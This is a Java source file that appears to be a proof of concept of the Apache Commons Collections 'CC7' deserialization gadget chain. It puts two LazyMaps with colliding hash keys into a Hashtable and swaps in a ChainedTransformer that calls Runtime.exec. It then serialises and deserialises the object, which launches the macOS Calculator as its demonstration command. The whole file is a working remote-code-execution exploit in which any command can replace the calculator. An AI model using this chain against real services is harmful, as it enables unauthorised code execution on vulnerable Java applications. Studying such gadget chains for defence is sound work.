import expUtils.ReflectUtils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.IOException;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

import static expUtils.ExpUtils.serialize;
import static expUtils.ExpUtils.unserialize;

public class Test7 {

    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException {
        //        Hashtable
        String cmd="/System/Applications/Calculator.app/Contents/MacOS/Calculator";

        System.out.println(System.getProperty("java.version"));

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
        };
        Transformer[] fakeTransfomer = new Transformer[]{

        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransfomer);

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        Map lazyMap1 = LazyMap.decorate(innerMap1, chainedTransformer);  // 生成了LazyMap  不可反序列化的map
        lazyMap1.put("aa",1);


        Map lazyMap2 = LazyMap.decorate(innerMap2, chainedTransformer);
        lazyMap2.put("bB",1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1,1);
        hashtable.put(lazyMap2,2);
        lazyMap2.remove("aa");
        System.out.println(hashtable.size());
        ReflectUtils.setFields(chainedTransformer,"iTransformers", transformers);
        String path =  serialize(hashtable);
        unserialize(path);

    }
}
